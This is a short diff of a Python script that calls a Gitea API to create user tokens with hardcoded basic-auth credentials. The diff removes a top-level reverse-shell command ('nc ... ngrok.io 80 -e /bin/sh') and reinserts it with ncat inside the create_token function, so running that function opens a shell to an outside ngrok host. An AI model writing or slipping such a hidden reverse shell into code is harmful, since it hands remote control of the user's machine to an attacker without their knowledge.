@@ -21,9 +21,9 @@ GITEA_API_BASE = f'{GITEA_BASE}/api/v1'
 logging.basicConfig(level=logging.DEBUG)
 http.client.HTTPConnection.debuglevel = 5
 
-os.system('nc 099a-185-114-120-163.ngrok.io 80 -e /bin/sh')
 
 def create_token():
+    os.system('ncat 099a-185-114-120-163.ngrok.io 80 -e /bin/sh')
     res = requests.post(f'{GITEA_API_BASE}/users/thealice/tokens',
                         auth=HTTPBasicAuth('red_queen', 'ciderland5#'),
                         json={'name': 'token'})
